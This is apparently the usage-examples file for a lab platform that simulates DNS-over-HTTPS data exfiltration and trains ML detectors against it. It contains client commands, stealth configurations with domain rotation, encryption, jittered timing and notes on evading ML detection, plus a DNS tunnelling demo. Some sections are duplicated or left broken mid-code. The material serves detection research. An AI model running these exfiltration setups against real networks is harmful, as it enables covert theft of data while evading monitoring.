# Usage Examples

## 🎯 Basic Examples

### Simple Text Exfiltration
```bash
# Create test data
echo "Secret corporate data" > /tmp/secret.txt

# Basic exfiltration using JSON configuration
docker exec -it exfil_client bash -c "
cd /app
python run_client.py --config test_configs/quick_test.json --file /tmp/secret.txt
"

# Monitor detection
docker logs -f exfil_interceptor
```

### Binary File Exfiltration
```bash
# Create test binary file
dd if=/dev/urandom of=/tmp/binary_data.bin bs=1024 count=5

# Exfiltrate using speed benchmark configuration
docker exec -it exfil_client bash -c "
cd /app
python run_client.py --config test_configs/speed_benchmark.json --file /tmp/binary_data.bin
"
```
```bash
# Generate binary test file
dd if=/dev/urandom of=/tmp/data.bin bs=1024 count=5

# Exfiltrate with compression
docker exec -it exfil_client python3 -c "
from client import *
config = ExfiltrationConfig(
    compression=True,
    encoding=EncodingType.BASE64
)
client = DoHExfiltrationClient(config)
client.exfiltrate_file('/tmp/data.bin')
"
```

## 🔧 Configuration Generation Examples

### Creating Custom Configurations

#### Generate APT Simulation Configuration
```bash
cd exfiltration/client/
python config_generator.py --create

# Interactive prompts:
# Name: APT Simulation
# Description: Advanced persistent threat simulation
# DoH Server: https://doh.local/dns-query  
# Target Domain: update-service.local
# Chunk Size: 8
# Encoding: base32
# Timing Pattern: random
# Base Delay: 30.0
# Compression: yes
# Encryption: yes
# Encryption Key: apt_long_term_key
# Domain Rotation: yes
# Backup Domains: security-updates.local,maintenance-api.local
```

#### Using Template Configurations
```bash
# Create all template configurations
python config_generator.py --templates

# List available configurations
python config_generator.py --list

# Expected output:
# 📋 Configurations disponibles (4):
# ==================================================
# 📄 quick_test
#    📝 Configuration rapide pour tests de base
#    ⚙️ Chunks: 30, Encoding: base64, Timing: regular
#    🎯 Detection: 🔴 High
# 
# 📄 stealth_research
#    📝 Configuration furtive pour recherche d'évasion
#    ⚙️ Chunks: 15, Encoding: custom, Timing: stealth
#    🎯 Detection: 🟢 Low
```

### Real Configuration Examples

#### 1. APT Simulation Configuration
```json
{
  "name": "APT Simulation",
  "description": "Simulation d'APT avec exfiltration très lente et discrète",
  "exfiltration_config": {
    "doh_server": "https://doh.local/dns-query",
    "target_domain": "update-service.local",
    "chunk_size": 8,
    "encoding": "base32",
    "timing_pattern": "random",
    "base_delay": 30.0,
    "delay_variance": 15.0,
    "compression": true,
    "encryption": true,
    "encryption_key": "apt_long_term_key",
    "subdomain_randomization": true,
    "domain_rotation": true,
    "backup_domains": [
      "security-updates.local",
      "maintenance-api.local",
      "status-check.local"
    ],
    "padding": true,
    "padding_size": 20
  },
  "test_files": [
    "financial_records.xlsx",
    "employee_data.csv"
  ],
  "detection_expected": false,
  "notes": "Simulation APT : très lents délais, rotation domaines, chiffrement"
}
```

#### 2. Speed Benchmark Configuration
```json
{
  "name": "Speed Benchmark",
  "description": "Configuration optimisée pour vitesse maximale",
  "exfiltration_config": {
    "doh_server": "https://doh.local/dns-query",
    "target_domain": "fast-api.local",
    "chunk_size": 55,
    "encoding": "base64",
    "timing_pattern": "burst",
    "base_delay": 0.001,
    "burst_size": 20,
    "burst_delay": 0.1,
    "compression": true,
    "subdomain_randomization": false
  },
  "test_files": ["large_file.bin"],
  "detection_expected": true,
  "notes": "Test de vitesse maximale - facilement détectable"
}
```

#### 3. Stealth Research Configuration
```json
{
  "name": "Stealth Research", 
  "description": "Configuration furtive pour recherche d'évasion",
  "exfiltration_config": {
    "doh_server": "https://doh.local/dns-query",
    "target_domain": "cdn-service.local",
    "chunk_size": 15,
    "encoding": "custom",
    "timing_pattern": "stealth",
    "base_delay": 5.0,
    "delay_variance": 2.0,
    "compression": true,
    "encryption": true,
    "encryption_key": "research_stealth_key",
    "subdomain_randomization": true,
    "padding": true,
    "padding_size": 12,
    "domain_rotation": true,
    "backup_domains": ["api-cache.local", "media-cdn.local"]
  },
  "test_files": ["sensitive_data.json", "credentials.txt"],
  "detection_expected": false,
  "notes": "Techniques d'évasion avancées pour contourner la détection ML"
}
```

### Configuration Testing and Validation

#### Test Configuration Before Use
```bash
# Test a configuration with default test file
python config_generator.py --test apt_simulation.json

# Test with specific file
python config_generator.py --test stealth_research.json --file sensitive_data.txt

# Expected output:
# 🧪 Test de la configuration: APT Simulation
# 📝 Description: Simulation d'APT avec exfiltration très lente et discrète
# 📁 Fichier de test créé: temp_test_file.txt
# ✅ Test réussi!
```

#### Edit Existing Configuration
```bash
# Edit configuration interactively
python config_generator.py --edit apt_simulation.json

# Prompts for editing:
# 📝 Édition de: APT Simulation
# 💡 Appuyez sur Entrée pour garder la valeur actuelle
# Nom [APT Simulation]: APT Simulation v2
# Description [Simulation d'APT...]: Updated APT simulation with enhanced stealth
# ✅ Configuration mise à jour: test_configs/apt_simulation.json
```

### Running Configured Exfiltration Tests

#### Basic Execution
```bash
# Run with JSON configuration
cd exfiltration/client/
python run_client.py --config test_configs/apt_simulation.json

# Run with specific test file
python run_client.py --config test_configs/stealth_research.json --file custom_data.txt
```

#### Expected Execution Flow
```bash
# APT Simulation execution
python run_client.py --config test_configs/apt_simulation.json

# Output:
# 🎯 Configuration: APT Simulation
# 📊 Target Domain: update-service.local
# 📦 Chunk Size: 8, Encoding: base32
# ⏱️ Timing: random (30.0s ± 15.0s)
# 🔐 Encryption: ✅ (apt_long_term_key)
# 🗜️ Compression: ✅
# 🎲 Domain Rotation: ✅ (3 backup domains)
# 
# 📁 Processing: financial_records.xlsx
# 📤 Chunk 1/156: dGVzdA== → a7f9-update-service.local
# ⏳ Waiting 27.3s before next chunk...
# 📤 Chunk 2/156: ZGF0YQ== → b2k1-security-updates.local
# ⏳ Waiting 41.8s before next chunk...
# ...
# ✅ Exfiltration completed successfully
```

## 🤖 ML Workflow Examples

### Training Models
```bash
# Quick development training
cd ml_analyzer
python3 model_trainer.py --quick

# View training results
cat ../ml_reports/random_forest_report.txt
ls -la ../models/
```

### Analyzing Detected Traffic
```bash
# 1. Wait for DoHLyzer to generate analysis
ls -la traffic_analyzer/output/output.csv

# 2. Filter for detected exfiltration patterns
cd exfiltration/client
./filter_detection_csv.sh

# 3. Classify with ML models
cd ../../ml_analyzer
python3 predictor.py --input ../traffic_analyzer/output/filtered_output.csv

# 4. View results
cat prediction_results.json
```

### Custom Dataset Training
```bash
# Using CIRA-CIC-DoHBrw-2020 dataset
# 1. Download dataset from: https://www.unb.ca/cic/datasets/dohbrw-2020.html

# 2. Place CSV files in datasets directory
ls -la datasets/
# Expected: CSV files from CIRA-CIC-DoHBrw-2020 dataset

# 3. Verify dataset format
head -5 datasets/l2-benign.csv
head -5 datasets/l2-malicious.csv

# 4. Train with the dataset
cd ml_analyzer/
python3 model_trainer.py

# 5. Check model performance
cat ml_reports/*.txt
```

### Dataset Feature Analysis
```bash
# Analyze CIRA-CIC-DoHBrw-2020 dataset features
python3 -c "
import pandas as pd
import glob

# Load all CSV files
csv_files = glob.glob('datasets/*.csv')
for file in csv_files:
    print(f'\\n=== {file} ===')
    df = pd.read_csv(file)
    print(f'Shape: {df.shape}')
    print(f'Columns: {list(df.columns)}')
    if 'Label' in df.columns:
        print(f'Labels: {df[\"Label\"].value_counts()}')
"
```

## 📊 Analysis Examples

### Real-time Monitoring
```bash
# Terminal 1: Start exfiltration
docker exec -it exfil_client python3 client.py

# Terminal 2: Monitor detection
watch -n 2 'ls -lt exfiltration/server/captured/ | head -5'

# Terminal 3: Watch traffic analysis
tail -f traffic_analyzer/output/output.csv
```

### Pattern Analysis
```bash
# View detected patterns
docker logs exfil_interceptor | grep "EXFILTRATION DETECTED"

# Analyze chunk reconstruction
ls -la exfiltration/server/captured/
file exfiltration/server/captured/*

# Check detection statistics
docker exec exfil_interceptor python3 -c "
import json
from pathlib import Path
files = list(Path('/app/captured').glob('*.txt'))
print(f'Files reconstructed: {len(files)}')
total_size = sum(f.stat().st_size for f in files)
print(f'Total data recovered: {total_size} bytes')
"
```

## 🔍 Advanced Scenarios

### Multi-Session Exfiltration
```python
# Simulate multiple concurrent exfiltrations
import threading
from client import DoHExfiltrationClient, create_default_config

def exfiltrate_session(session_id, data):
    config = create_default_config()
    client = DoHExfiltrationClient(config)
    client.exfiltrate_data(data.encode(), f"session_{session_id}")

# Start multiple sessions
threads = []
for i in range(3):
    data = f"Session {i} confidential data with unique content {i*100}"
    thread = threading.Thread(target=exfiltrate_session, args=(i, data))
    threads.append(thread)
    thread.start()

# Wait for completion
for thread in threads:
    thread.join()
```

### Adaptive Chunk Sizing
### Adaptive Configuration Selection
```bash
# Script to select configuration based on file size
cat > adaptive_test.sh << 'EOF'
#!/bin/bash
FILE_PATH="$1"
FILE_SIZE=$(wc -c < "$FILE_PATH")

if [ "$FILE_SIZE" -lt 1024 ]; then
    # Small files - use stealth
    CONFIG="test_configs/stealth_research.json"
elif [ "$FILE_SIZE" -lt 10240 ]; then
    # Medium files - use quick test
    CONFIG="test_configs/quick_test.json"
else
    # Large files - use speed benchmark
    CONFIG="test_configs/speed_benchmark.json"
fi

echo "File size: $FILE_SIZE bytes, using config: $CONFIG"
python run_client.py --config "$CONFIG" --file "$FILE_PATH"
EOF

chmod +x adaptive_test.sh

# Usage
./adaptive_test.sh /path/to/any_file.dat
```

### Custom Configuration Creation
```bash
# Create custom configuration for specific scenario
python config_generator.py --create

# Edit existing configuration
python config_generator.py --edit custom_scenario.json

# Validate configuration before use
python config_generator.py --test custom_scenario.json --file test_data.txt
```

## 📈 Performance Testing

### Throughput Testing
```bash
### Performance Testing
```bash
# Test different chunk sizes with speed benchmark configuration
for size in 8 15 30 50; do
    echo "Testing chunk size: $size"
    # Create temporary config with specific chunk size
    jq --arg size "$size" '.exfiltration_config.chunk_size = ($size | tonumber)' \
       test_configs/speed_benchmark.json > temp_config_$size.json
    
    time python run_client.py --config temp_config_$size.json --file test_data.txt
    rm temp_config_$size.json
done
```

### Detection Latency
```bash
# Measure detection speed using timestamp analysis
echo "Testing detection latency..."

# Start exfiltration in background
echo "$(date '+%s.%N'): Starting exfiltration" > timing.log
python run_client.py --config test_configs/quick_test.json --file latency_test.txt &

# Monitor for detection
while true; do
    if ls /app/captured/latency_test* >/dev/null 2>&1; then
        echo "$(date '+%s.%N'): Detection confirmed" >> timing.log
        break
    fi
    sleep 0.1
done

# Calculate latency
awk 'NR==1{start=$1} NR==2{end=$1} END{printf "Detection latency: %.2f seconds\n", end-start}' timing.log
```

## 🎓 Educational Scenarios

### DNS Covert Channel Basics
```python
# Simple DNS tunneling demonstration
def basic_dns_tunnel(message):
    import base64
    encoded = base64.urlsafe_b64encode(message.encode()).decode()
    
    # Split into DNS-safe chunks
    chunk_size = 30
    chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
    
    # Generate DNS queries
## 🎓 Educational Scenarios

### DNS Covert Channel Basics
```bash
# Simple DNS tunneling demonstration
cat > basic_tunnel_demo.py << 'EOF'
import base64
import json

def basic_dns_tunnel(message):
    """Demonstrate basic DNS tunnel concept"""
    encoded = base64.urlsafe_b64encode(message.encode()).decode().rstrip('=')
    chunks = [encoded[i:i+30] for i in range(0, len(encoded), 30)]
    
    queries = []
    for i, chunk in enumerate(chunks):
        query = f"{i:04d}-{chunk}.tunnel.local"
        queries.append(query)
    
    return queries

# Demonstrate concept
message = "This is a covert message sent via DNS"
dns_queries = basic_dns_tunnel(message)
for query in dns_queries:
    print(f"DNS Query: {query}")
EOF

python basic_tunnel_demo.py
```

### Detection Evasion Study
```bash
# Study detection evasion techniques using different configurations
echo "=== Detection Evasion Study ==="

# Test 1: Small chunks with stealth timing
echo "Testing: Small Chunks + Stealth Timing"
python run_client.py --config test_configs/stealth_research.json --file evasion_test1.txt

# Test 2: APT simulation with domain rotation
echo "Testing: APT Simulation + Domain Rotation"
python run_client.py --config test_configs/apt_simulation.json --file evasion_test2.txt

# Test 3: Speed benchmark (easily detectable)
echo "Testing: Speed Benchmark (Control)"
python run_client.py --config test_configs/speed_benchmark.json --file evasion_test3.txt

# Analyze results
echo "Checking detection results..."
ls -la /app/captured/evasion_test*
```

## 🔬 Research Applications

### Behavioral Analysis
```bash
# Analyze exfiltration timing patterns
cat > timing_analysis.py << 'EOF'
import json
import time
import numpy as np

def analyze_timing_patterns():
    """Analyze timing patterns from different configurations"""
    configs = [
        "test_configs/quick_test.json",
        "test_configs/stealth_research.json", 
        "test_configs/apt_simulation.json"
    ]
    
    for config_file in configs:
        with open(config_file) as f:
            config = json.load(f)
        
        name = config['name']
        timing = config['exfiltration_config'].get('timing_pattern', 'regular')
        delay = config['exfiltration_config'].get('base_delay', 0.2)
        variance = config['exfiltration_config'].get('delay_variance', 0.0)
        
        print(f"Configuration: {name}")
        print(f"  Timing Pattern: {timing}")
        print(f"  Base Delay: {delay}s")
        print(f"  Variance: {variance}s")
        print()

analyze_timing_patterns()
EOF

python timing_analysis.py
```

def analyze_timing_behavior(queries_count=50):
    timestamps = []
    
    config = create_default_config()
    client = DoHExfiltrationClient(config)
    
    for i in range(queries_count):
        start = time.time()
        # Simulate query
        client.exfiltrate_data(f"Data chunk {i}".encode(), f"timing_test_{i}")
        timestamps.append(time.time())
    
    # Analyze intervals
    intervals = np.diff(timestamps)
    
    print(f"Mean interval: {np.mean(intervals):.3f}s")
    print(f"Std deviation: {np.std(intervals):.3f}s")
    print(f"Coefficient of variation: {np.std(intervals)/np.mean(intervals):.3f}")
    
    return {
        'intervals': intervals,
        'mean': np.mean(intervals),
        'std': np.std(intervals),
        'cv': np.std(intervals)/np.mean(intervals)
    }

# Run analysis
timing_data = analyze_timing_behavior()
```

These examples demonstrate the full range of capabilities available in the DoH Exfiltration Detection Platform, from basic usage to advanced research scenarios.
